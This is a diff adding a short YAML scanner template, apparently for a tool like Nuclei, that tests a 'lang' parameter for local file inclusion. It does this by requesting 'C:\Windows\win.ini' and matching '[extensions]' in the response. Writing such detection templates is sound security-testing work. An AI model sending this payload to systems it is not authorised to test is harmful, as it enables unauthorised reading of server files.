@@ -1,0 +1,20 @@
+id: lfi6-0508
+name: 'Traversal in lang'
+severity: high
+type: active
+tags:
+  - lfi
+  - traversal
+  - file
+description: 'Reads sensitive file via lang'
+requests:
+  - method: GET
+    path: '{{BaseURL}}'
+    payloads:
+      lang:
+        - 'C:\Windows\win.ini'
+    matchers:
+      - type: word
+        part: body
+        words:
+          - '[extensions]'
